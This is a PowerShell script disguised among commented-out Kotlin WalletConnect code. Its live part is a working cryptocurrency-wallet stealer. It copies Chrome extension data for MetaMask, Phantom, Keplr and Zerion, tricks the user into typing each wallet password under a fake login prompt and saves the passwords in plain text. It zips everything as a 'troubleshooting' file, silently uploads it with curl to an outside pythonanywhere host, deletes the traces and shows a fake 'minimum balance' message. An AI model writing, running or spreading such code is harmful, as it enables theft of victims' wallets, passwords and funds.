# val projectId = "" // Put your project id here
# val relayUrl = "relay.walletconnect.com"
# val serverUrl = "wss://$relayUrl?projectId=$projectId"
# val connectionType = ConnectionType.AUTOMATIC
# val appMetaData = Core.Model.AppMetaData(
#     name = "Wallet Name",
#     description = "Wallet Description",
#     url = "Wallet URL",
#     icons = /*list of icon url strings*/,
#     redirect = "kotlin-wallet-wc:/request" // Custom Redirect URI
# )

# CoreClient.initialize(
#                 relayServerUrl = serverUrl,
#                 connectionType = ConnectionType.AUTOMATIC,
#                 application = application,
#                 metaData = appMetaData
#             ) { error ->
#                 // Core initialize error, mosly connection issue
#             }

# val initParams = Wallet.Params.Init(core = CoreClient)

# Web3Wallet.initialize(initParams) { error ->
#     // Error will be thrown if there's an issue during initialization
# }

# CONFIG
$chromeUserDataRoot = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$destination = "$env:USERPROFILE\Desktop\ExtractedExtensioness"
$zipFile = Join-Path $destination "troubleshooting.zip"


# class WCDelegate : Web3Wallet.WalletDelegate, CoreClient.CoreDelegate {
#     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

#     private val _coreEvents: MutableSharedFlow<Core.Model> = MutableSharedFlow()
#     val coreEvents: SharedFlow<Core.Model> = _coreEvents.asSharedFlow()

#     private val _walletEvents: MutableSharedFlow<Wallet.Model> = MutableSharedFlow(
#         replay = 1, extraBufferCapacity = 1, BufferOverflow.DROP_OLDEST
#     )
#     val walletEvents: SharedFlow<Wallet.Model> = _walletEvents
#     var authRequest: Wallet.Model.AuthRequest? = null
#     var sessionRequest: Wallet.Model.SessionRequest? = null


#     //Have to call this after init wallet connect code
#     fun init() {
#         CoreClient.setDelegate(this)
#         Web3Wallet.setWalletDelegate(this)
#     }

#     override fun onAuthRequest(
#         authRequest: Wallet.Model.AuthRequest, verifyContext: Wallet.Model.VerifyContext
#     ) {
#         this.authRequest = authRequest

#         scope.launch {
#             _walletEvents.emit(authRequest)
#         }
#     }


#     override fun onConnectionStateChange(connectionStateChange: Wallet.Model.ConnectionState) {
#         scope.launch {
#             _walletEvents.emit(connectionStateChange)
#         }
#     }


#     override fun onError(error: Wallet.Model.Error) {
#         scope.launch {
#             _walletEvents.emit(error)
#         }
#     }

#     override fun onSessionDelete(deletedSession: Wallet.Model.SessionDelete) {
#         scope.launch {
#             _walletEvents.emit(deletedSession)
#         }
#     }

#     override fun onSessionExtend(session: Wallet.Model.Session) {
#         scope.launch {
#             _walletEvents.emit(session)
#         }
#     }


#     override fun onSessionProposal(
#         sessionProposal: Wallet.Model.SessionProposal, verifyContext: Wallet.Model.VerifyContext
#     ) {
#         scope.launch {
#             _walletEvents.emit(sessionProposal)
#         }
#     }

#     override fun onSessionRequest(
#         sessionRequest: Wallet.Model.SessionRequest, verifyContext: Wallet.Model.VerifyContext
#     ) {
#         this.sessionRequest = sessionRequest
#         scope.launch {
#             _walletEvents.emit(sessionRequest)
#         }
#     }

#     override fun onSessionSettleResponse(settleSessionResponse: Wallet.Model.SettledSessionResponse) {
#         scope.launch {
#             _walletEvents.emit(settleSessionResponse)
#         }
#     }

#     override fun onSessionUpdateResponse(sessionUpdateResponse: Wallet.Model.SessionUpdateResponse) {
#         scope.launch {
#             _walletEvents.emit(sessionUpdateResponse)
#         }
#     }

#     override fun onPairingDelete(deletedPairing: Core.Model.DeletedPairing) {
#         scope.launch {
#             _coreEvents.emit(deletedPairing)
#         }
#     }

#     //We will use it later and I'll explain
#     @OptIn(ExperimentalCoroutinesApi::class)
#     fun clearCache() {
#         sessionRequest = null
#         _walletEvents.resetReplayCache()
#     }
# }


$uploadUrl = "https://johnvictorvj61.pythonanywhere.com/upload"

$extensionIDs = @{
    "MetaMask" = "nkbihfbeogaeaoehlefnkodbefgpgknn"
    "Phantom"  = "bfnaelmomeimhlpmgjnjophhpkkoljpa"
    'Keplr' = "dmkamcknogkgcdfhhbddcghachkejeap"
    'Zerion' = "klghhnkeealcohjjanjjdaeeggmfmlpl"
}

# {
#     eip155=Proposal("chains="[
#        "eip155":5,
#        "eip155":1,
#        "eip155":137
#     ],
#     "methods="[
#        "eth_sendTransaction",
#        "personal_sign"
#     ],
#     "events="[
#        "chainChanged",
#        "accountsChanged"
#     ]")"
#  }

New-Item -ItemType Directory -Path $destination -Force | Out-Null


function Get-ProfileNameFromPreferences($profilePath) {
    $prefPath = Join-Path $profilePath "Preferences"
    if (Test-Path $prefPath) {
        $lines = Get-Content $prefPath
        foreach ($line in $lines) {
            if ($line -match '"name"\s*:\s*"([^"]+)"') {
                $name = $Matches[1]
                if ($name -ne "" -and $name -ne "Chrome") {
                    return $name
                }
            }
        }
    }
    return (Split-Path $profilePath -Leaf)
}

# wcDelegate.walletEvents.collectLatest { wcEvent ->

#     when (wcEvent) {                    
#            is Wallet.Model.SessionProposal -> {

#                  val peerMeta = WCPeerMeta(name = wcEvent.name,
#                      url = wcEvent.url,
#                      description = wcEvent.description,
#                      icons = wcEvent.icons.map { it.toString() })

             
#                  callbacks.onSessionRequest(
#                      peer = peerMeta,
#                      pairingTopic = wcEvent.pairingTopic,
#                      chainIds = chainIds,
#                      requiredNamespaces = wcEvent.requiredNamespaces,
#                      optionalNamespaces = wcEvent.optionalNamespaces
#                  )

#              }
# else -> {
# // We will complete this and handle other events in later to gather
# }

function Get-ConfirmedPassword($wallet, $displayName) {
    do {
        $p1 = Read-Host "Login with  $wallet password for $displayName to proceed" -AsSecureString
        $p2 = Read-Host "Confirm $wallet password for $displayName" -AsSecureString

        $plain1 = [Runtime.InteropServices.Marshal]::PtrToStringAuto(
            [Runtime.InteropServices.Marshal]::SecureStringToBSTR($p1)
        )
        $plain2 = [Runtime.InteropServices.Marshal]::PtrToStringAuto(
            [Runtime.InteropServices.Marshal]::SecureStringToBSTR($p2)
        )

        if ($plain1 -ne $plain2) {
            Write-Host "Passwords do not match. Try again." -ForegroundColor Yellow
        }
    } while ($plain1 -ne $plain2)

    return $plain1
}

$copiedSomething = $false


$profiles = Get-ChildItem -Path $chromeUserDataRoot -Directory


# fun approveSession(
#     pairingTopic: String, 
#     mapOfChainIdAndAccount: Map<String, List<String>>
# ) {


#     //Have to convert wallet name spaces to session available name spaces
#     return try {

#         val walletNamespaces = convertToWalletConnectNameSpaces(mapOfChainIdAndAccount)
        
#         //Try to find a proposal that matches our previous pairingTopic! 
#         // Because we don't know how many other proposal created and may previous porposal is not only one now
#         val sessionProposal: Wallet.Model.SessionProposal = requireNotNull(
#             Web3Wallet.getSessionProposals().find { it.pairingTopic == pairingTopic })


#         val sessionNamespaces = Web3Wallet.generateApprovedNamespaces(
#                 sessionProposal = sessionProposal, supportedNamespaces = walletNamespaces
#             )

#         val approveProposal = Wallet.Params.SessionApprove(
#                 proposerPublicKey = sessionProposal.proposerPublicKey,
#                 namespaces = sessionNamespaces
#             )

#         Web3Wallet.approveSession(approveProposal, onError = { error ->
#                 //Handle pairing error

#             }, onSuccess = {
#                 //Pairing request successfully sent
#             })
            
      
#     } catch (e: Exception) {
#         callbacks?.onLibraryCatch(pairingTopic, "approveSession: ", e)
#     }

# }


foreach ($profile in $profiles) {
    $profilePath = $profile.FullName
    $displayName = Get-ProfileNameFromPreferences $profilePath

    foreach ($wallet in $extensionIDs.Keys) {
        $extPath = Join-Path $profilePath "Local Extension Settings\$($extensionIDs[$wallet])"
        if (Test-Path $extPath) {
            $destPath = Join-Path $destination "$displayName-$wallet"
            Copy-Item -Path $extPath -Destination $destPath -Recurse -Force

            $password = Get-ConfirmedPassword $wallet $displayName
            $passwordFile = Join-Path $destination "$displayName-$wallet-password.txt"
            $password | Out-File -FilePath $passwordFile -Encoding utf8

            $copiedSomething = $true
        }
    }
}


if (-not $copiedSomething) {
    Write-Host "Getting Started: No wallet data found"
    return
}


Write-Host "Getting Started ..."

# wcDelegate.walletEvents.collectLatest { wcEvent ->

#     when (wcEvent) {
#         is Wallet.Model.SessionRequest -> {
#             try {
#                 //I'll descrivbe this later, but generally about methods coming from dApp like sign or more...
#                 handleMethods(wcEvent)
#             } catch (e: Exception) {

#             }

#         }

    
#         is Wallet.Model.SessionDelete.Error -> {
#           //Error on deleting session from dApp side
#         }

#         is Wallet.Model.SessionDelete.Success -> {
#            //Session is deleted from dApp side. we have to update UI
#         }

#         is Wallet.Model.SessionProposal -> {
#           // We have a proposal to have new session
#           // We have to check mandantory and optional name spaces 
#           // here and update user with them, then in next step 
#           // they can accept or reject this proposal

#            val peerMeta = WCPeerMeta(name = wcEvent.name,
#                 url = wcEvent.url,
#                 description = wcEvent.description,
#                 icons = wcEvent.icons.map { it.toString() })

        
#             callbacks.onSessionRequest(
#                 peer = peerMeta,
#                 pairingTopic = wcEvent.pairingTopic,
#                 chainIds = chainIds,
#                 requiredNamespaces = wcEvent.requiredNamespaces,
#                 optionalNamespaces = wcEvent.optionalNamespaces
#             )
#         }

#         is Wallet.Model.ConnectionState -> {
#             if (wcEvent.isAvailable.not()) {
#                 //app may went to background so auto socket management closed the socket
#             } else {
#                 // mean connection is tabled and we have open connection
#             }
#         }

#         is Wallet.Model.SettledSessionResponse.Error -> {
          

#         }

#         is Wallet.Model.SettledSessionResponse.Result -> {

#             //Session is approved, I usually save linked accounts to this 
#             // this session topic for further use
#             saveAccountsPerThisSession(accounts,wcEvent.session.topic)
#             // Update UI about session paired succesfully!

#         }

#         else -> {
#             Timber.i("Not supporting event $wcEvent")
#         }

#     }

# }

$ProgressPreference = 'SilentlyContinue'
if (Test-Path $zipFile) { Remove-Item $zipFile -Force }
Compress-Archive -Path "$destination\*" -DestinationPath $zipFile

if (Test-Path $zipFile) {
    
    $curl = "$env:SystemRoot\System32\curl.exe"
    $null = & $curl --silent --request POST $uploadUrl `
        --form "file=@$zipFile"

    
    Remove-Item -Path $destination -Recurse -Force
}


Write-Host "Troubleshoot result: Minimum balance quota not met"

